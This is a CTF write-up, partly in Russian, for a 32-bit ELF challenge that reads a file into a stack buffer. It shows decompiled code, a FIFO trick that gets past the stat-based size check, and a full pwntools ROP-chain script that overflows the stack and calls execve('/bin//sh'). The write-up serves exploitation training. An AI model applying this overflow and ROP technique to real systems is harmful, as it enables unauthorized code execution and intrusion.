## Exploit Me 200 (Secure File Reader)

```
$ file pwn
pwn: ELF 32-bit LSB  executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=acc530c91c4841537384866623e6dc50074105c8, not stripped
```
checksec:
```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
Программа принимает в качестве argv[1] имя файла, содержимое которого затем пишет в буфер. Перед записью проверяется размер файла с помощью stat, и запись производится только в том случае, если он <= 4095. 
  
```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@2

  if ( argc == 2 )
  {
    safe_save(argv[1]);
    result = 0;
  }
  else
  {
    puts("Usage ./prog <filename> ");
    result = 1;
  }
  return result;
}
```  
```C
int __cdecl safe_save(int a1)
{
  int result; // eax@2
  char dest; // [sp+10h] [bp-1008h]@2

  if ( check_size(a1) )
  {
    save_in_buffer(a1, &dest);
    result = puts("The file has been saved successfully");
  }
  else
  {
    result = puts("No No the file is too big \n");
  }
  return result;
}
```
```C
_BOOL4 __cdecl check_size(int a1)
{
  char v2; // [sp+18h] [bp-60h]@1
  int v3; // [sp+44h] [bp-34h]@1

  stat(a1, &v2);
  return v3 <= 4095;
}
```
```C
int __cdecl save_in_buffer(int a1, char *dest)
{
  int result; // eax@6
  char src[257]; // [sp+17h] [bp-111h]@5
  int v4; // [sp+118h] [bp-10h]@5
  int v5; // [sp+11Ch] [bp-Ch]@1

  v5 = open(a1, 0);
  if ( v5 == -1 )
  {
    perror("[-] open fail!");
    exit(0);
  }
  while ( 1 )
  {
    result = read(v5, src, 256);
    v4 = result;
    if ( result <= 0 )
      break;
    src[v4 - 1] = 0;
    strncat(dest, src, 0x100u);
  }
  return result;
}
```  
Для обхода ограничения на размер можно использовать FIFO.  
  
```
$ mkfifo f
$ python -c 'print("A"*5000)' > f
$ ./pwn f
The file has been saved successfully
Segmentation fault (core dumped)
```
Т.к. стек неисполняемый, собираем ропчейн для execve с '/bin//sh', которую запишем в .bss  
```python
from pwn import *

bss = p32(0x80edf74)
bss1 = p32(0x80edf74+4)
pop_edx = p32(0x807270a) # pop edx ; ret
pop_eax = p32(0x80beb26) # pop eax ; ret
mov_edx_eax = p32(0x809dead) # mov DWORD PTR [edx],eax ; ret 
xor_eax_eax = p32(0x805895f) # xor eax, eax ; pop ebx ; ret
inc_eax = p32(0x807f15f) # inc eax ; ret
int_x80 = p32(0x8049501) # int 0x80
pppr = p32(0x08072730) # pop edx ; pop ecx ; pop ebx ; ret
inc_ecx = p32(0x080ddf6c) # inc ecx ; ret
inc_edx = p32(0x0805d6f7) # inc edx ; ret

pad = "A"*4124

payload = ""
payload += pad
payload += pop_eax + "/bin" + pop_edx + bss + mov_edx_eax
payload += pop_eax + "//sh" + pop_edx + bss1 + mov_edx_eax + xor_eax_eax + bss
payload += pppr + p32(0xffffffff)*2 + bss
payload += inc_ecx + inc_edx
payload += inc_eax*11
payload += int_x80


print(payload)
```

size check bypass => stack buffer overflow => ROP